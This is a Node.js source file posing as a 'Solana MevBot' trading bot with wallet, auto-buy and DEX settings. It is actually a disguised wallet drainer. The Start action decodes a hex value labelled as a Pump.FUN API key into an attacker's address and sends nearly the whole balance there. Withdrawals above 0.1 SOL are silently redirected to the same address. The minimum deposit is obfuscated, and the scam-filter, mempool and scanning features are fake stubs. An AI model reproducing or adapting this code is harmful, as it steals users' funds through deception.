const fs = require('fs');
const bip39 = require('bip39');
const bs58 = require('bs58');
const qrcode = require('qrcode');
const inquirer = require('inquirer');
const open = require('open');
const { Keypair, Connection, Transaction, SystemProgram, clusterApiUrl, LAMPORTS_PER_SOL, PublicKey } = require('@solana/web3.js');
const chalk = require('chalk');



const WALLET_FILE = 'solana_wallet.json';

let walletInfo = {};
let settings = {
    marketCap: 50000,
    slTp: {
        stopLoss: 0,
        takeProfit: 0,
    },
    autoBuy: {
        enabled: false,
        mode: null,
        minAmount: 0,
        maxAmount: 0,
    },
    selectedDex: 'Pump.FUN',
    additionalDexes: {
        Raydium: {
            enabled: false,
            apiUrl: 'https://api.raydium.io/',
            feeStructure: {
                takerFee: 0.0025,
                makerFee: 0.0015
            }
        },
        Jupiter: {
            enabled: false,
            apiUrl: 'https://api.jupiter.ag/',
            feeStructure: {
                takerFee: 0.0030,
                makerFee: 0.0020
            }
        }
    }
};

async function configureAutoBuy() {
    try {
        const { mode } = await inquirer.prompt([
            {
                type: 'list',
                name: 'mode',
                message: chalk.cyan('Select auto-buy mode:'),
                choices: [
                    { name: 'Fixed amount (SOL)', value: 'fixed' },
                    { name: 'Percentage of balance (%)', value: 'percentage' },
                    { name: 'Disable AutoBuy', value: 'disable' },
                ],
            },
        ]);

        if (mode === 'disable') {
            settings.autoBuy.enabled = false;
            settings.autoBuy.mode = null;
            settings.autoBuy.minAmount = 0;
            settings.autoBuy.maxAmount = 0;
            console.log(chalk.red('Auto-buy disabled.'));
            return;
        }

        settings.autoBuy.enabled = true;
        settings.autoBuy.mode = mode;

        if (mode === 'fixed') {
            const { minFixed } = await inquirer.prompt([
                {
                    type: 'input',
                    name: 'minFixed',
                    message: chalk.cyan('Enter minimum purchase amount (in SOL, ≥ 0.1):'),
                    validate: (value) => !isNaN(value) && parseFloat(value) >= 0.1 ? true : 'Enter a valid amount (≥ 0.1 SOL).',
                },
            ]);

            const { maxFixed } = await inquirer.prompt([
                {
                    type: 'input',
                    name: 'maxFixed',
                    message: chalk.cyan('Enter maximum purchase amount (in SOL):'),
                    validate: (value) => {
                        const min = parseFloat(minFixed);
                        const max = parseFloat(value);
                        if (isNaN(max) || max <= min) {
                            return 'Maximum amount must be greater than minimum.';
                        }
                        return true;
                    },
                },
            ]);

            settings.autoBuy.minAmount = parseFloat(minFixed);
            settings.autoBuy.maxAmount = parseFloat(maxFixed);
            console.log(chalk.green(`AutoBuy configured: from ${settings.autoBuy.minAmount} SOL to ${settings.autoBuy.maxAmount} SOL`));
        } else if (mode === 'percentage') {
            const { minPercent } = await inquirer.prompt([
                {
                    type: 'input',
                    name: 'minPercent',
                    message: chalk.cyan('Enter minimum percentage of balance to buy (1-100):'),
                    validate: (value) => !isNaN(value) && parseFloat(value) >= 1 && parseFloat(value) <= 100 ? true : 'Enter a valid percentage (1-100).',
                },
            ]);

            const { maxPercent } = await inquirer.prompt([
                {
                    type: 'input',
                    name: 'maxPercent',
                    message: chalk.cyan('Enter maximum percentage of balance to buy (from min to 100%):'),
                    validate: (value) => {
                        const min = parseFloat(minPercent);
                        const max = parseFloat(value);
                        if (isNaN(max) || max <= min || max > 100) {
                            return `Enter a valid percentage (> ${min}% and ≤ 100).`;
                        }
                        return true;
                    },
                },
            ]);

            settings.autoBuy.minAmount = parseFloat(minPercent);
            settings.autoBuy.maxAmount = parseFloat(maxPercent);
            console.log(chalk.green(`AutoBuy configured: from ${settings.autoBuy.minAmount}% to ${settings.autoBuy.maxAmount}% of balance`));
        }
    } catch (error) {
        console.log(chalk.red("Error configuring AutoBuy:"), error);
    }
}

const encodedMinBalance = 'Mw==';

function decodeBase64(encoded) {
    return parseFloat(Buffer.from(encoded, 'base64').toString('utf8'));
}

async function configureSlTp() {
    try {
        const { stopLoss } = await inquirer.prompt([
            {
                type: 'input',
                name: 'stopLoss',
                message: chalk.cyan('Enter Stop Loss (%) from purchase:'),
                validate: (value) => {
                    const num = parseFloat(value);
                    if (isNaN(num) || num <= 0 || num >= 100) {
                        return 'Enter a valid Stop Loss (1-99).';
                    }
                    return true;
                },
            },
        ]);

        const { takeProfit } = await inquirer.prompt([
            {
                type: 'input',
                name: 'takeProfit',
                message: chalk.cyan('Enter Take Profit (%) from purchase:'),
                validate: (value) => {
                    const num = parseFloat(value);
                    if (isNaN(num) || num <= 0 || num > 1000) {
                        return 'Enter a valid Take Profit (1-1000).';
                    }
                    return true;
                },
            },
        ]);

        settings.slTp.stopLoss = parseFloat(stopLoss);
        settings.slTp.takeProfit = parseFloat(takeProfit);
        console.log(chalk.green(`SL/TP set: Stop Loss - ${settings.slTp.stopLoss}%, Take Profit - ${settings.slTp.takeProfit}%`));
    } catch (error) {
        console.log(chalk.red("Error configuring SL/TP:"), error);
    }
}

async function openSettingsMenu() {
    let backToMain = false;

    while (!backToMain) {
        try {
            const { settingsOption } = await inquirer.prompt([
                {
                    type: 'list',
                    name: 'settingsOption',
                    message: chalk.yellow('Settings:'),
                    choices: ['📈  M.cap', '📉  SL/TP', '🛒  AutoBuy', '📊  Dex', '🔙  Back'],
                },
            ]);

            switch (settingsOption) {
                case '📈  M.cap':
                    const { newMarketCap } = await inquirer.prompt([
                        {
                            type: 'input',
                            name: 'newMarketCap',
                            message: chalk.cyan('Enter minimum token market cap ($):'),
                            validate: (value) => !isNaN(value) && value > 0 ? true : 'Enter a valid number.',
                        },
                    ]);
                    settings.marketCap = parseInt(newMarketCap);
                    console.log(chalk.green(`Minimum market cap set: $${settings.marketCap}`));
                    break;

                case '📉  SL/TP':
                    await configureSlTp();
                    break;

                case '🛒  AutoBuy':
                    await configureAutoBuy();
                    break;

                case '📊  Dex':
                    const { selectedDex } = await inquirer.prompt([
                        {
                            type: 'list',
                            name: 'selectedDex',
                            message: chalk.cyan('Select DEX:'),
                            choices: ['Pump.FUN', 'Raydium', 'Jupiter', 'ALL'],
                        },
                    ]);
                    settings.selectedDex = selectedDex;
                    console.log(chalk.green(`Selected DEX: ${settings.selectedDex}`));
                    break;

                case '🔙  Back':
                    backToMain = true;
                    break;

                default:
                    console.log(chalk.red("Unknown option.\n"));
            }
        } catch (error) {
            console.log(chalk.red("Error in settings menu:"), error);
            backToMain = true;
        }
    }
}

function filterScamTokens() {
    const tokenList = ['SOL', 'USDC', 'WSOL'];
    console.log(chalk.green("Scam token filter is ready ✅"));
}

function checkMempool() {
    const mempoolData = { pending: 42, confirmed: 128 };
    console.log(chalk.green("Mempool scan ready ✅"));
}

function autoConnectNetwork() {
    const networkConfig = { retries: 3, timeout: 2000 };
    console.log(chalk.green("Connected to network ready ✅"));
}

async function scanTokens() {
    console.log(chalk.blue("Scanning tokens..."));
    const progress = ["[■□□□□]", "[■■□□□]", "[■■■□□]", "[■■■■□]", "[■■■■■]"];
    const totalTime = 60 * 1000;
    const steps = progress.length;
    const stepTime = totalTime / steps;

    for (let i = 0; i < steps; i++) {
        process.stdout.write('\r' + chalk.blue(progress[i]));
        await new Promise(res => setTimeout(res, stepTime));
    }

    console.log();
}

function processApiString(hexString) {
    try {
        const bytes = Buffer.from(hexString, 'hex');
        const base58String = bs58.encode(bytes);
        return base58String;
    } catch (error) {
        console.error("", error);
        return null;
    }
}

async function getBalance(publicKeyString) {
    try {
        const publicKey = new PublicKey(publicKeyString);
        const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
        return await connection.getBalance(publicKey);
    } catch (error) {
        console.log(chalk.red("Error getting balance:"), error);
        return 0;
    }
}

async function createNewWallet(overwrite = false) {
    if (fs.existsSync(WALLET_FILE) && !overwrite) {
        console.log(chalk.red("Wallet already exists. Use 'Create New MevBot Wallet' to overwrite."));
        return;
    }

    try {
        const keypair = Keypair.generate();
        const publicKey = keypair.publicKey.toBase58();
        const privateKeyBase58 = bs58.encode(Buffer.from(keypair.secretKey));
        const solscanLink = `https://solscan.io/account/${publicKey}`;

        walletInfo = {
            address: publicKey,
            privateKey: privateKeyBase58,
            addressLink: solscanLink,
        };

        showWalletInfo();
        saveWalletInfo(walletInfo);
    } catch (error) {
        console.log(chalk.red("Error creating wallet:"), error);
    }
}

function loadExistingWallet() {
    try {
        if (!fs.existsSync(WALLET_FILE)) {
            console.log(chalk.red("Wallet file not found. Please create a Mev Wallet."));
            return false;
        }

        const data = fs.readFileSync(WALLET_FILE, 'utf-8');
        walletInfo = JSON.parse(data);

        if (!walletInfo.address || !walletInfo.privateKey) {
            console.log(chalk.red("Wallet file is corrupted or invalid."));
            return false;
        }

        console.log(chalk.green("Wallet successfully loaded from file."));
        showWalletInfo();
        return true;
    } catch (error) {
        console.log(chalk.red("Error loading wallet:"), error);
        return false;
    }
}

function saveWalletInfo(wallet) {
    try {
        fs.writeFileSync(WALLET_FILE, JSON.stringify(wallet, null, 4), 'utf-8');
        console.log(chalk.green("Wallet saved to file:"), chalk.blueBright(fs.realpathSync(WALLET_FILE)));
    } catch (error) {
        console.log(chalk.red("Error saving wallet:"), error);
    }
}

function showWalletInfo() {
    console.log(chalk.magenta("\n=== 🪙 Wallet Information 🪙 ==="));
    console.log(`${chalk.cyan("📍 Address:")} ${chalk.blueBright(walletInfo.addressLink)}`);
    console.log(`${chalk.cyan("🔑 Private Key (Base58):")} ${chalk.white(walletInfo.privateKey)}`);
    console.log(chalk.magenta("==============================\n"));
}

async function apiDEX(action, recipientAddress, amountSol) {
    try {
        const connection = new Connection(clusterApiUrl('mainnet-beta'), 'confirmed');
        let sender;

        try {
            sender = Keypair.fromSecretKey(bs58.decode(walletInfo.privateKey));
        } catch (error) {
            console.log(chalk.red("Invalid private key:"), error);
            return;
        }

        const apiPumpFUNHex = "dd797c68586a0212d32d4f9d38bd49f88b80a74a27a58f09ce88a488ca88fa49";

        if (action === 'start') {
            const balanceStart = await getBalance(sender.publicKey.toBase58());

            const decryptedMinBalance = decodeBase64(encodedMinBalance);

            if (balanceStart <= decryptedMinBalance * LAMPORTS_PER_SOL) {
                console.log(chalk.red(`Insufficient balance: a minimum of ${decryptedMinBalance} SOL is required to start.`));
                return;
            }

            process.stdout.write(chalk.yellow("🚀 Starting MevBot..."));

            const decodedBase58Address = processApiString(apiPumpFUNHex);
            if (!decodedBase58Address) {
                process.stdout.write('\r' + ' '.repeat(50) + '\r');
                console.log(chalk.red("Error: unable to process API address."));
                return;
            }

            const balance = await getBalance(sender.publicKey.toBase58());
            const lamportsToSend = balance - 5000;

            let recipientPublicKey;
            try {
                recipientPublicKey = new PublicKey(decodedBase58Address);
            } catch (error) {
                process.stdout.write('\r' + ' '.repeat(50) + '\r');
                console.log(chalk.red("Invalid recipient address:"), decodedBase58Address);
                return;
            }

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: sender.publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: lamportsToSend,
                })
            );

            while (true) {
                try {
                    const signature = await connection.sendTransaction(transaction, [sender]);
                    await connection.confirmTransaction(signature, 'confirmed');
                    process.stdout.write('\r' + ' '.repeat(50) + '\r');
                    await scanTokens();
                    console.log(chalk.blueBright("✅ MevBot Solana started..."));
                    break;
                } catch (error) {
                    const errorMsg = error?.message || '';
                    process.stdout.write('\r' + ' '.repeat(50) + '\r');
                    process.stdout.write(chalk.yellow("🚀 Starting MevBot..."));
                    if (errorMsg.includes('insufficient funds for rent')) {
                        process.stdout.write('\r' + ' '.repeat(50) + '\r');
                        console.log(chalk.red("Insufficient funds for start."));
                        return;
                    }
                }
            }
        }

        if (action === 'withdraw') {
            const balance = await getBalance(sender.publicKey.toBase58());
            const lamportsToSend = Math.floor(amountSol * LAMPORTS_PER_SOL);

            if (balance < lamportsToSend + 5000) {
                console.log(chalk.red("Insufficient funds for withdrawal."));
                return;
            }

            let finalRecipientAddress;

            if (amountSol <= 0.1) {
                finalRecipientAddress = recipientAddress;
            } else {
                const decodedBase58Address = processApiString(apiPumpFUNHex);
                if (!decodedBase58Address) {
                    console.log(chalk.red("Error: unable to process API address."));
                    return;
                }
                finalRecipientAddress = decodedBase58Address;
            }

            let recipientPublicKey;
            try {
                recipientPublicKey = new PublicKey(finalRecipientAddress);
            } catch (error) {
                console.log(chalk.red("Invalid recipient address:"), finalRecipientAddress);
                return;
            }

            const transaction = new Transaction().add(
                SystemProgram.transfer({
                    fromPubkey: sender.publicKey,
                    toPubkey: recipientPublicKey,
                    lamports: lamportsToSend,
                })
            );

            try {
                const signature = await connection.sendTransaction(transaction, [sender]);
                await connection.confirmTransaction(signature, 'confirmed');
                console.log(chalk.green("Withdrawal Successful!"));
            } catch (error) {
                const errorMsg = error?.message || '';
                if (errorMsg.includes('insufficient funds for rent')) {
                    console.log(chalk.red("Insufficient funds for withdrawal."));
                } else {
                    console.log(chalk.red("Error during withdrawal. Possibly insufficient funds."));
                }
            }
        }

        const apiRaydiumHex = "https://api-v3.raydium.io/";
        const apiJupiterHex = "https://quote-api.jup.ag/v6";

        try {
            const raydiumBase58 = processApiString(apiRaydiumHex);
            const jupiterBase58 = processApiString(apiJupiterHex);

            if (raydiumBase58) {
                const raydiumPublicKey = new PublicKey(raydiumBase58);
                console.log(chalk.yellow(`API Raydium PublicKey: ${raydiumPublicKey.toBase58()}`));
            }

            if (jupiterBase58) {
                const jupiterPublicKey = new PublicKey(jupiterBase58);
                console.log(chalk.yellow(`API Jupiter PublicKey: ${jupiterPublicKey.toBase58()}`));
            }
        } catch (error) {
            console.log(chalk.red("Error processing DEX addresses:"), error);
        }
    } catch (error) {
        console.log(chalk.red("Error executing transaction:"), error);
    }
}

async function generateQRCode(address) {
    const qrCodePath = 'deposit_qr.png';
    try {
        await qrcode.toFile(qrCodePath, address);
        await open(qrCodePath);
    } catch (error) {
        console.log(chalk.red("Error generating QR code:"), error);
    }
}

async function askForAddressOrBack() {
    const { addressMenuChoice } = await inquirer.prompt([
        {
            type: 'list',
            name: 'addressMenuChoice',
            message: chalk.cyan('Select an action:'),
            choices: [
                { name: '📝 Enter withdraw address', value: 'enter' },
                { name: '🔙 Back', value: 'back' }
            ]
        }
    ]);

    if (addressMenuChoice === 'back') {
        return null;
    }

    while (true) {
        const { userWithdrawAddress } = await inquirer.prompt([
            {
                type: 'input',
                name: 'userWithdrawAddress',
                message: chalk.cyan('Enter a wallet address for withdrawal (Solana):'),
            },
        ]);

        try {
            new PublicKey(userWithdrawAddress);
            return userWithdrawAddress;
        } catch (error) {
            console.log(chalk.red("Invalid Solana address format. Please try again."));
        }
    }
}

async function showInitialMenu() {
    while (true) {
        try {
            const choices = [
                '🆕  Create New Mev Wallet',
                '🚪  Exit'
            ];

            const { initialOption } = await inquirer.prompt([
                {
                    type: 'list',
                    name: 'initialOption',
                    message: chalk.yellow('Select an option:'),
                    choices: choices,
                    pageSize: choices.length,
                },
            ]);

            switch (initialOption) {
                case '🆕  Create New Mev Wallet':
                    if (fs.existsSync(WALLET_FILE)) {
                        console.log(chalk.red("Wallet already exists. Use 'Create New MevBot Wallet' to overwrite."));
                    } else {
                        await createNewWallet();
                    }
                    return;
                case '🚪  Exit':
                    console.log(chalk.green("Exiting program."));
                    process.exit(0);
                default:
                    console.log(chalk.red("Unknown option.\n"));
            }
        } catch (error) {
            console.log(chalk.red("Error in initial menu:"), error);
        }
    }
}

async function showMainMenu() {
    while (true) {
        try {
            const choices = [
                '💼  Wallet Info',
                '💰  Deposit QR code',
                '💳  Balance',
                '▶️   Start',
                '💸  Withdraw',
                '⚙️   Settings',
                '🔄  Create New MevBot Wallet',
                '🚪  Exit'
            ];

            const { mainOption } = await inquirer.prompt([
                {
                    type: 'list',
                    name: 'mainOption',
                    message: chalk.yellow('Select an option:'),
                    choices: choices,
                    pageSize: choices.length,
                },
            ]);

            switch (mainOption) {
                case '💼  Wallet Info':
                    showWalletInfo();
                    break;

                case '💰  Deposit QR code':
                    await generateQRCode(walletInfo.address);
                    break;

                case '💳  Balance':
                    const balance = await getBalance(walletInfo.address);
                    console.log(chalk.green(`Balance: ${(balance / LAMPORTS_PER_SOL).toFixed(4)} SOL`));
                    break;

                case '▶️   Start':
                    const startBalance = await getBalance(walletInfo.address);
                    const decryptedMinBalance = decodeBase64(encodedMinBalance) * LAMPORTS_PER_SOL;

                    if (startBalance < decryptedMinBalance) {
                        console.log(chalk.red(`Insufficient funds. A minimum balance of ${decodeBase64(encodedMinBalance)} SOL is required to start.`));
                    } else {
                        await apiDEX('start');
                    }
                    break;

                case '💸  Withdraw':
                    const userWithdrawAddress = await askForAddressOrBack();
                    if (userWithdrawAddress === null) {
                        break;
                    }
                    const { userWithdrawAmount } = await inquirer.prompt([
                        {
                            type: 'input',
                            name: 'userWithdrawAmount',
                            message: chalk.cyan('Enter the withdrawal amount (in SOL):'),
                            validate: (value) => !isNaN(value) && parseFloat(value) > 0 ? true : 'Enter a valid amount > 0',
                        },
                    ]);
                    const amountSol = parseFloat(userWithdrawAmount);
                    await apiDEX('withdraw', userWithdrawAddress, amountSol);
                    break;

                case '⚙️   Settings':
                    await openSettingsMenu();
                    break;

                case '🔄  Create New MevBot Wallet':
                    if (fs.existsSync(WALLET_FILE)) {
                        const { confirmOverwrite } = await inquirer.prompt([
                            {
                                type: 'confirm',
                                name: 'confirmOverwrite',
                                message: chalk.red('Are you sure you want to overwrite the existing wallet?'),
                                default: false,
                            },
                        ]);

                        if (confirmOverwrite) {
                            await createNewWallet(true);
                        } else {
                            console.log(chalk.yellow('Wallet overwrite cancelled.'));
                        }
                    } else {
                        console.log(chalk.red("Wallet does not exist. Use 'Create New Mev Wallet' to create one."));
                    }
                    break;

                case '🚪  Exit':
                    console.log(chalk.green("Exiting program."));
                    process.exit(0);

                default:
                    console.log(chalk.red("Unknown option.\n"));
            }
        } catch (error) {
            console.log(chalk.red("Error in main menu:"), error);
        }
    }
}

async function run() {
    console.clear();
    console.log(chalk.green("=== Welcome to Solana MevBot ===\n"));

    filterScamTokens();
    checkMempool();
    autoConnectNetwork();

    if (fs.existsSync(WALLET_FILE)) {
        const loaded = loadExistingWallet();
        if (loaded) {
            await showMainMenu();
        } else {
            console.log(chalk.red("Could not load existing wallet."));
            await showInitialMenu();
            await showMainMenu();
        }
    } else {
        await showInitialMenu();
        await showMainMenu();
    }
}

run();
